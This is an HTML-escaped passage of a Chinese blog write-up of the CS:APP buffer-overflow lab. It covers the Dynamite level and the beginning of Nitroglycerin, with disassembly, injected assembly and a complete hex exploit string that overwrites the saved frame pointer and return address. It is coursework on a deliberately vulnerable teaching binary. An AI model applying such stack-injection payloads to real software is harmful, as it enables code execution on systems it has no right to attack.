+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 78 3e 68 55
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;运行结果如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228172102205.png&#34;
+	width=&#34;1656&#34;
+	height=&#34;180&#34;
+	srcset=&#34;chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228172102205_hu11419975026370298406.png 480w, chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228172102205_hu2703723239893593598.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;图4&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;920&#34;
+		data-flex-basis=&#34;2208px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;level3-dynamite&#34;&gt;level3： Dynamite
+&lt;/h3&gt;&lt;p&gt;目标：注入一段能够修改 getbuf 返回值的代码，返回值从 1 改成 cookie 值，此外还需要还原所有破坏，继续运行 test 的剩下部分，注意getbuf函数开头的push %ebp。&lt;/p&gt;
+&lt;p&gt;同样回到 getbuff 的汇编代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-s&#34; data-lang=&#34;s&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;080491&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getbuf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80491&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;m&#34;&gt;55&lt;/span&gt;                   	&lt;span class=&#34;n&#34;&gt;push&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;80491f5:	89 e5                	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;80491f7:	83 ec 38             	sub    $0x38,%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80491&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;45&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d8&lt;/span&gt;             	&lt;span class=&#34;n&#34;&gt;lea&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;-0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp),%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80491&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;m&#34;&gt;89&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;04&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;             	&lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;%eax,(%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;8049200&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;e8&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f5&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fa&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt;       	&lt;span class=&#34;n&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;8048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfa&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gets&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;8049205&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;b8&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;       	&lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;%&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;804920&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;c9&lt;/span&gt;                   	&lt;span class=&#34;n&#34;&gt;leave&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;804920&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;c3&lt;/span&gt;                   	&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;注意到调用Gets函数后，会将eax寄存器置1，于是我们需要跳过这条命令，再修改eax寄存器的值，最后返回到调用getbuf函数的下一条命令，不能回到getbuf函数的leave命令，因为返回test函数的地址已经没了，如果返回到getbuf函数的leave命令，那么还需在ret后面添加test函数的返回地址。&lt;/p&gt;
+&lt;p&gt;结合 test 的前几行代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-s&#34; data-lang=&#34;s&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;08048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;daa&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;8048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;daa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;m&#34;&gt;55&lt;/span&gt;                   	&lt;span class=&#34;n&#34;&gt;push&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048dab:	89 e5                	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048dad:	53                   	push   %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ebx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;8048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dae&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;m&#34;&gt;83&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ec&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;             	&lt;span class=&#34;n&#34;&gt;sub&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%esp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048db1:	e8 da ff ff ff       	call   8048d90 &amp;lt;uniqueval&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048db6:	89 45 f4             	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;-0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;xc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048db9:	e8 36 04 00 00       	call   80491f4 &amp;lt;getbuf&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048dbe:	89 c3                	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;%&lt;span class=&#34;n&#34;&gt;ebx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;8048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;e8&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cb&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt;       	&lt;span class=&#34;n&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;8048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d90&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uniqueval&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;所以应当构造 Gets 的栈帧如下：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;地址&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;解释&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;返回地址&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;设置成缓冲区的首地址&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;占用4字节&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp - 40 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;buf 数组的初始地址，从这里开始注入修改 eax 的代码&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp - 0x38&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;esp，栈帧首地址&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;构造的汇编命令如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-s&#34; data-lang=&#34;s&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;.text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;b8&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;86&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;07&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ce&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;       	&lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x2bce0786&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;%&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;m&#34;&gt;68&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;92&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;04&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt;       	&lt;span class=&#34;n&#34;&gt;push&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x804920a&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;c3&lt;/span&gt;                   	&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;为了防止对栈的破坏，ebp 是被调用者保存寄存器，是 test 在调用 getbuf 之后，getbuf 首先就就压进了栈帧里。同时为了使程序继续运行，需要保证 ebp 不被破坏。使用 gdb，在 getbuf 的第一行 &lt;code&gt;0x080491f4 &lt;/code&gt;处打下断点，研究此时ebp 的值，ebp的值为0x55683ed0。&lt;/p&gt;
+&lt;p&gt;所以构造的答案为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;b8 86 07 ce 2b 68 be 8d
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;04 08 c3 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;d0 3e 68 55 78 3e 68 55
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;最后的运行结果为：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228194621167.png&#34;
+	width=&#34;1659&#34;
+	height=&#34;154&#34;
+	srcset=&#34;chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228194621167_hu15423384204403914886.png 480w, chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228194621167_hu13687697589192297713.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;图5&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1077&#34;
+		data-flex-basis=&#34;2585px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;level4nitroglycerin这个实验的解题思路有点没有理解&#34;&gt;level4：Nitroglycerin（这个实验的解题思路有点没有理解）
+&lt;/h3&gt;&lt;p&gt;目标：使用-n参数进入该实验，该实验会连续调用5次getbufn，要求我们每次在调用getbufn函数后返回cookie值，而不是1，同时还需恢复所有破坏。&lt;/p&gt;
+&lt;p&gt;和前面不同的是，这一个阶段由于使用的是 getbufn 和 testn 函数，并且需要将一个相同的字符串输入五次。所以需要使用命令-n&lt;/p&gt;
+&lt;p&gt;同时，文档也指出在 getbufn 中有&lt;code&gt;#define KABOOM_BUFFER_SIZE 512&lt;/code&gt;，所以缓冲区大小为 512.&lt;/p&gt;
+&lt;p&gt;这次研究 getbufn 的汇编代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-s&#34; data-lang=&#34;s&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gdb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;disas&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Dump&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;assembler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getbufn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;mh&#34;&gt;0x0804920c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;+0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;push&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;   0x0804920d &amp;lt;+1&amp;gt;:	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;    # esp 减去了 536 个字节
